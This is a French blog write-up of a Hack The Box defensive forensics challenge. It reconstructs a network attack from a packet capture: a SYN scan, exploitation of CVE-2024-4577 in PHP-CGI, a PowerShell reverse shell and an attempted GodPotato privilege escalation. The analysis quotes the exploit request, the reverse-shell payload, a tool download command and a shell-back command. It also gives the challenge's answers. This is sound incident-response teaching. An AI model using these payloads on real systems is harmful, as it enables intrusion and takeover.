---
date: 2026-04-25T06:07:35-05:00
# description: ""
image: "/images/HTB-PacketPuzzle/Packet_Puzzle.png"
showTableOfContents: true
tags: ["HackTheBox", "Sherlock", "SOC", "wireshark", "TCP-SYN-scan", "pcap-analysis", "mitre-attck", "T1190", "cve-2024-4577", "php", "php-cgi"]
categories: ["Blue Teaming"]
title: "HTB: Packet Puzzle"
type: "post"
---

* Platforme: Hack The Box
* Lien: [Packet Puzzle](https://app.hackthebox.com/sherlocks/Packet%2520Puzzle) 
* Niveau: Facile
* Categorie: SOC
---

# Scénario Sherlock

Vous êtes analyste junior en sécurité dans une petite entreprise japonaise spécialisée dans le trading de cryptomonnaies. Après avoir détecté une activité suspecte sur le réseau interne, vous avez exporté un fichier PCAP afin de mener une enquête plus approfondie. Analysez cette capture pour déterminer si l'environnement a été compromis et reconstituer les actions de l'attaquant.

# Résumé

Cette investigation a consisté à analyser un fichier de capture de paquets réseau (PCAP) suite à la détection d'une activité suspecte au sein d'un environnement interne. L'objectif était de déterminer si le système avait été compromis et de reconstituer les actions de l'attaquant.

L'analyse a révélé que l'hôte interne `192.168.170.128` avait mené une opération de reconnaissance sur `192.168.170.130`, identifiant `8 ports ouverts`, le `port 22 (SSH)` ayant été le premier à être découvert. L'attaquant a ensuite exploité une vulnérabilité dans une application web accessible au public à l'aide de `CVE-2024-4577`, en ciblant un système fonctionnant sous `PHP 8.1.25`.

L'exploitation réussie a permis à l'attaquant d'exécuter des commandes sous l'identité de l'utilisateur victime, établissant finalement une connexion de shell inversé à `22/01/2025 09:47:32`. Cette activité correspond à la technique MITRE ATT&CK `T1190 (Exploitation d'une application accessible au public)` pour l'accès initial.

Après la compromission initiale, l'attaquant a tenté une élévation de privilèges en téléchargeant l'outil `GodPotato-NET4.exe` et en l'exécutant via un binaire déguisé. La commande a utilisé des techniques d'usurpation de jeton pour obtenir des privilèges de niveau SYSTEM ; cependant, la tentative a échoué et le message d'erreur suivant s'est affiché:

```
Cannot create process Win32Error:2
```

# Tâche 1 - Quelle est l'adresse IP source de l'attaquant impliqué dans cette attaque?

## Méthodologie

L'analyse a débuté par un aperçu général de l'activité du réseau à l'aide des vues `Statistics` --> `Endpoints` et `Conversations` de Wireshark.

- L'hôte `192.168.170.130` a été identifié comme le système le plus actif dans la capture, présentant:
    - le plus grand nombre de paquets échangés
    - des communications avec le plus grand nombre d'adresses IP distinctes

Au vu de ce comportement, l'adresse `192.168.170.130` a été considérée comme la **cible probable (victime)**.

![Endpoints view](/images/HTB-PacketPuzzle/most_pkts.png)

![Conversations view](/images/HTB-PacketPuzzle/convos_victim.png)

Afin de déterminer quels hôtes ont établi des connexions vers ce système, le filtre suivant a été appliqué:

```
ip.dst == 192.168.170.130 && tcp.flags.syn == 1 && tcp.flags.ack == 0
```

Il isole les premières tentatives de connexion TCP (paquets SYN) adressées à la victime présumée.

## Observations

Une seule adresse IP source a été observée en train d'initier des connexions vers `192.168.170.130` : `192.168.170.128`.

![attacker to victim packets](/images/HTB-PacketPuzzle/attk_vict.png)

Un examen plus approfondi du trafic filtré a révélé :

- Une transmission rapide de paquets SYN (plusieurs de ces paquets ont des horodatages identiques ou presque identiques)
- Plusieurs ports de destination ciblés (par exemple, 21, 22, 25, 53, 110, 443, 8080) avec le même port source (42654)
- L'absence de handshakes TCP finalisés

![SYN packets sent](/images/HTB-PacketPuzzle/many_SYN.png)

Ce schéma est caractéristique d'un balayage de ports TCP SYN, une technique de reconnaissance couramment utilisée par les attaquants pour identifier les services accessibles sur un système cible.

## Conclusion

L'hôte `192.168.170.128` a été identifié comme étant à l'origine de l'attaque. Son comportement, et plus particulièrement le balayage systématique de plusieurs ports sur `192.168.170.130`, indique une activité de reconnaissance active.

# Tâche 2 - Combien de ports ouverts l'attaquant a-t-il découvert sur le système de la victime?

Lors d'un scan SYN :

|Comportement|Signification|
|---|---|
|SYN → SYN/ACK → RST|✅ **Le port est OUVERT**|
|SYN → RST|❌ **Le port est FERMÉ**|

## Méthodologie

Après avoir identifié `192.168.170.128` comme étant l'attaquant et `192.168.170.130` comme étant la victime, l'étape suivante consistait à déterminer quels ports avaient été identifiés comme ouverts lors de l'analyse.

Lors d'un scan TCP SYN, un port ouvert est indiqué par une réponse SYN-ACK provenant de la cible. Pour isoler ces réponses, le filtre Wireshark suivant a été appliqué:

```
ip.src == 192.168.170.130 && ip.dst == 192.168.170.128 && tcp.flags.syn == 1 && tcp.flags.ack == 1
```

Il affiche les paquets dans lesquels la victime (`192.168.170.130`) répond à l'attaquant avec les indicateurs SYN et ACK activés, confirmant ainsi que le port de destination correspondant est ouvert.

![Open ports found](/images/HTB-PacketPuzzle/open_ports.png)

## Observations

L'analyse du trafic filtré a révélé plusieurs réponses SYN-ACK envoyées par la victime à l'attaquant. En examinant les ports source (`tcp.srcport`) de ces paquets et en comptant les valeurs uniques, un total de 8 ports ouverts distincts a été identifié sur le système de la victime.

## Conclusion

Au cours de la phase de reconnaissance, l'attaquant a réussi à identifier **8 ports ouverts** sur l'hôte cible `192.168.170.130`.

# Tâche 3 - Quel est le premier port ouvert qui a répondu sur le système de la victime lors de la phase de reconnaissance?

## Méthodologie

Afin de déterminer le premier port ouvert détecté par l'attaquant, l'analyse s'est concentrée sur les réponses de la victime (`192.168.170.130`) indiquant des ports ouverts lors du balayage SYN.

Le filtre appliqué précédemment affiche tous les ports ayant répondu avec les indicateurs SYN et ACK, signalant ainsi qu'ils étaient ouverts. Les résultats ont ensuite été triés selon la colonne `Time` afin d'identifier la réponse la plus ancienne.

## Observations

Le premier paquet SYN-ACK détecté correspond à la connexion suivante:

- Source: `192.168.170.130`
- Destination: `192.168.170.128`
- Port: 22 (SSH)

Ce qui indique que le port 22 a été le premier port ouvert détecté par l'attaquant lors de la phase de reconnaissance.

![port 22 first discovered](/images/HTB-PacketPuzzle/open_ports.png)

## Conclusion

Le premier port ouvert ayant répondu sur le système de la victime est le **22**.

# Tâche 4 - Quel est l'identifiant CVE de la vulnérabilité exploitée par l'attaquant?

## Méthodologie

Une fois la phase de reconnaissance terminée, l'étape suivante consistait à analyser le trafic au niveau de la couche application afin d'identifier d'éventuelles tentatives d'exploitation.

Afin d'isoler les requêtes HTTP POST, couramment utilisées pour transmettre des charges utiles d'exploitation, le filtre Wireshark suivant a été appliqué:

```
http.request.method == "POST"
```

Plusieurs requêtes POST provenant de l'attaquant (`192.168.170.128`) et visant la victime (`192.168.170.130`) ont été observées.

![POST requests sent](/images/HTB-PacketPuzzle/POST_reqs.png)

## Observations

Une requête HTTP POST récurrente a été identifiée, présentant la structure suivante:
```
POST /?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1
```

Principales observations :

- La requête contient des paramètres encodés :
    - `allow_url_include=1`
    - `auto_prepend_file=php://input`
- Ces directives tentent de modifier la configuration d'exécution de PHP
- Le payload est conçu pour forcer le serveur à exécuter le code fourni dans le corps de la requête HTTP

Ce schéma est révélateur d'une tentative d'exploitation ciblant une **vulnérabilité d'injection d'arguments PHP-CGI**, dans laquelle des chaînes de requête spécialement conçues sont interprétées comme des options de ligne de commande par l'interpréteur PHP.

![CVE-2024-4577](/images/HTB-PacketPuzzle/CVE-2024-4577.png)

## Analyse

La structure et le comportement de la requête correspondent étroitement aux techniques d'exploitation associées au CVE-2024-4577.

> Une recherche sur Google avec cette requête POST spécifique renvoie au `CVE-2024-4577`.

Cette vulnérabilité affecte PHP fonctionnant en mode CGI et permet à des attaquants de contourner les mécanismes de validation des entrées en injectant des arguments de ligne de commande, ce qui peut conduire à l'exécution de code à distance (RCE).

## Conclusion

L'attaquant a exploité une faille de sécurité liée à l'injection d'arguments PHP-CGI, identifiée sous le nom de: `CVE-2024-4577`.

Cette faille permet l'exécution de code à distance en injectant des directives malveillantes dans les paramètres de configuration PHP via des requêtes HTTP spécialement conçues.

# Tâche 5 - Quel est le nom et la version du produit vulnérable qui a été exploité pour obtenir un accès RCE?

## Méthodologie

Afin d'approfondir l'analyse de la phase d'exploitation, les requêtes HTTP POST lancées par l'attaquant ont été analysées à l'aide du filtre Wireshark suivant:

```
http.request.method == "POST"
```

L'une des requêtes identifiées a été sélectionnée, et son déroulement complet a été analysé à l'aide de la fonction `Follow --> TCP Stream` dans Wireshark. Cela a permis de reconstituer la requête et la réponse correspondante du serveur.

## Observations

Le flux TCP a révélé l'exécution de la commande suivante:
```
whoami /all
```

La réponse du serveur contenait des informations au niveau du système, confirmant que la commande à distance avait été exécutée avec succès. De plus, cette réponse révélait des détails sur l'environnement applicatif sous-jacent, notamment la version de PHP utilisée: PHP 8.1.25.

![php version](/images/HTB-PacketPuzzle/php_ver.png)

## Analyse

La présence du résultat de l'exécution de la commande confirme que l'attaquant a réussi à exploiter le système cible pour parvenir à l'exécution de code à distance (RCE).

La version PHP identifiée (`8.1.25`) correspond à la technique d'exploitation précédemment observée associée à `CVE-2024-4577`, une vulnérabilité d'injection d'arguments PHP-CGI affectant certaines configurations PHP.

## Conclusion

Le produit vulnérable exploité est : `PHP version 8.1.25`.

Cette version était installée sur le système cible et a été exploitée pour permettre l'exécution de code à distance.

# Tâche 6 - Quel est le nom d'utilisateur du compte de la victime?

Le paquet utilisé pour la tâche précédente affiche le résultat de la commande `whoami /all`. Le nom d'utilisateur du compte de la victime est : `cristo`.

![username](/images/HTB-PacketPuzzle/username.png)

# Tâche 7 - À quel moment l'attaquant a-t-il exécuté la commande lui permettant d'obtenir un premier accès au système de la victime?

## Méthodologie

Afin de déterminer à quel moment l'attaquant a obtenu un premier accès, les requêtes HTTP POST ont été analysées à l'aide du filtre Wireshark suivant:
```
http.request.method == "POST"
```

## Observations

Le flux TCP a révélé un payload PHP exécutant un shell inversé basé sur PowerShell :
```PHP
<?php system('powershell -NoP -NonI -W Hidden -Exec Bypass -Command "... TCPClient(\'192.168.170.128\',4545) ..."'); ?>
```

![reverse shell command](/images/HTB-PacketPuzzle/revshell_php.png)

Principales observations:

- Le payload établit une connexion inverse vers l'attaquant (`192.168.170.128`) sur le port `4545`
- Il permet l'exécution de commandes à distance en lisant et en exécutant en continu les commandes envoyées par l'attaquant
- Cela confirme la réussite de l'exploitation et la mise en place d'un point d'ancrage interactif

Pour déterminer l'heure exacte de cet événement, les détails du paquet ont été examinés dans la section `Frame`. Le champ `Arrival Time` indique:
`22 janvier 2025 04:47:32.295911000 EST`.

Converti en UTC, cela correspond à: 2025-01-22 09:47:32.

![Foothold timestamp](/images/HTB-PacketPuzzle/time_foothold.png)

## Analyse

Cette date indique le moment précis où l'attaquant est passé de l'exploitation à la **prise de contrôle active du système**. Elle marque le point d'ancrage initial, l'attaquant ayant établi un canal d'exécution de commandes persistant.

## Conclusion

L'attaquant a exécuté la commande lui permettant d'obtenir un premier accès à: `22/01/2025 09:47:32`.

# Tâche 8 - Quel est l'identifiant de technique MITRE ATT&CK utilisé par l'attaquant pour obtenir un accès initial?

## Méthodologie

Après avoir identifié la vulnérabilité exploitée (CVE-2024-4577) et analysé les requêtes HTTP POST malveillantes, le comportement de l'attaquant a été cartographié dans le cadre `MITRE ATT&CK` afin de classer la technique utilisée pour l'accès initial.

## Observations

L'attaquant a utilisé une requête HTTP spécialement conçue pour exploiter une vulnérabilité dans une application web accessible au public (PHP-CGI), ce qui a permis l'exécution de commandes arbitraires sur le système cible. Cela a notamment conduit au déploiement d'un shell inversé basé sur PowerShell, offrant ainsi à l'attaquant un accès à distance à l'hôte.

## Analyse

Cette activité correspond à la technique MITRE ATT&CK suivante:

> [T1190](https://attack.mitre.org/techniques/T1190/)

Cette technique décrit des scénarios dans lesquels des attaquants exploitent des vulnérabilités dans des applications accessibles depuis l'extérieur (par exemple, des serveurs web) pour obtenir un accès initial à un système.

## Conclusion

L'attaquant a réussi à s'introduire dans le système en utilisant: `T1190 - Exploit Public-Facing Application`.

# Tâche 9 - Quel est le nom du fichier exécutable malveillant que l'attaquant a téléchargé et exécuté en mémoire pour faciliter l'escalade de privilèges sur le endpoint?

## Méthodologie

Après avoir identifié une connexion de type reverse shell entre la victime (`192.168.170.130`) et l'attaquant (`192.168.170.128`) sur le port TCP `4545`, l'accent a été mis sur l'analyse des activités post-exploitation.

![reverse shell port](/images/HTB-PacketPuzzle/shell_port.png)

Pour isoler ce canal de communication de commande et de contrôle (C2), le filtre Wireshark suivant a été appliqué:
```php
tcp.port == 4545
```

Un paquet de ce flux a été sélectionné et analysé à l'aide de l'option Follow ---> TCP Stream afin de reconstituer la session interactive entre le attaquant et l'hôte compromis.

## Observations

Dans la session PowerShell reconstituée, l'attaquant a exécuté la commande suivante:
```
iwr -uri "https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe" -Outfile TimeProvider.exe
```

![GodPotato](/images/HTB-PacketPuzzle/GodPotato.png)

Principales observations :

- La commande utilise `iwr` (Invoke-WebRequest) pour télécharger un fichier exécutable distant
- Le fichier est récupéré à partir d'un dépôt GitHub public
- Le fichier téléchargé est enregistré localement sous le nom `TimeProvider.exe`, sans doute pour échapper à la détection
- Le nom d'origine du fichier exécutable est clairement identifiable dans l'URL : GodPotato-NET4.exe

## Analyse

Le fichier exécutable téléchargé, GodPotato-NET4.exe, est un outil connu d'élevage de privilèges qui exploite des failles de sécurité liées à l'usurpation d'identité des jetons Windows. Sa présence dans la chaîne d'attaque indique que l'attaquant a l'intention d'élever ses privilèges après avoir obtenu un accès initial.

Bien que le fichier soit enregistré sous un autre nom (`TimeProvider.exe`), l'outil réellement déployé est identifié à partir de l'URL source.

## Conclusion

Le fichier exécutable malveillant utilisé par le attaquant pour l'élévation de privilèges est: `GodPotato-NET4.exe`

# Tâche 10 - Quelle commande l'attaquant utilise-t-il pour procéder à une élévation de privilèges?


## Méthodologie

Une fois identifié le fichier exécutable malveillant utilisé pour l'escalade de privilèges, l'étape suivante a consisté à analyser la manière dont l'attaquant avait exécuté cet outil sur le système compromis.

Le canal de communication du shell inversé entre l'attaquant (`192.168.170.128`) et la victime (`192.168.170.130`) a été isolé à l'aide du filtre Wireshark suivant:

```
tcp.port == 4545
```

Un paquet de ce flux a été analysé à l'aide de la fonction Follow --> TCP Stream afin de reconstituer la session PowerShell interactive de l'attaquant.

## Observations

Au sein du flux TCP, l'attaquant a exécuté le fichier exécutable précédemment téléchargé (`TimeProvider.exe`, correspondant à GodPotato-NET4.exe) à l'aide de la commande suivante:

```
./TimeProvider.exe -cmd "time.exe 192.168.170.128 5555 -e cmd"
```

Les informations supplémentaires contenues dans le flux confirment :

- Une interaction réussie avec les mécanismes RPC/DCOM de Windows
- Une activité d'usurpation d'identité via un jeton
- Une élévation de privilèges de `NT AUTHORITY\NETWORK SERVICE` à `NT AUTHORITY\SYSTEM`


![privilege escalation command](/images/HTB-PacketPuzzle/privesc_cmd.png)

## Analyse

La commande utilise l'outil d'élévation de privilèges GodPotato pour:

- Exploiter l'usurpation de jeton Windows
- Exécuter un payload secondaire (`time.exe`)
- Établir un nouveau canal d'exécution de commandes vers l'attaquant sur le port `5555`

Ce processus illustre un workflow typique post-exploitation:

1. Télécharger l'outil d'élévation de privilèges
2. Exécuter l'outil avec une commande personnalisée
3. Tenter de lancer un shell disposant de privilèges plus élevés


## Conclusion

La ligne de commande utilisée par l'attaquant lors de l'escalade de privilèges est la suivante:

```
./TimeProvider.exe -cmd "time.exe 192.168.170.128 5555 -e cmd"
```

# Tâche 11 - L'attaquant n'a pas réussi à élever ses privilèges et a reçu un message d'erreur. Quel est ce message d'erreur?

## Méthodologie

Afin de déterminer pourquoi la tentative d'escalade de privilèges a échoué, la communication via le shell inversé entre l'attaquant (`192.168.170.128`) et la victime (`192.168.170.130`) a été analysée.

Le trafic pertinent a été isolé à l'aide de:
```
tcp.port == 4545
```

Le flux TCP a ensuite été reconstitué à l'aide de la fonction Follow --> TCP Stream afin d'examiner l'intégralité du résultat de la commande d'escalade de privilèges exécutée.

## Observations

La sortie de la commande exécutée (`TimeProvider.exe`, correspondant à GodPotato-NET4.exe) a montré que les étapes d'usurpation de jeton s'étaient déroulées avec succès, y compris l'élévation des privilèges vers : `NT AUTHORITY\SYSTEM`.

Cependant, le processus a finalement échoué pendant son exécution, générant le message d'erreur suivant:

```
Cannot create process Win32Error:2
```

![error message](/images/HTB-PacketPuzzle/error_msg.png)


## Analyse

L'erreur **Win32Error:2** indique généralement: `Le système ne trouve pas le fichier spécifié.`.

Cela suggère que, bien que le mécanisme d'élévation de privilèges ait réussi à obtenir un jeton de niveau SYSTEM, il a échoué lors de la tentative de lancement du processus spécifié (`time.exe`). Cela peut être dû à :

- L'absence de l'exécutable sur le système
- Un chemin d'accès incorrect
- Des restrictions du contexte d'exécution

## Conclusion

L'erreur rencontrée lors de la tentative d'élévation de privilèges est la suivante:

```
Cannot create process Win32Error:2
```


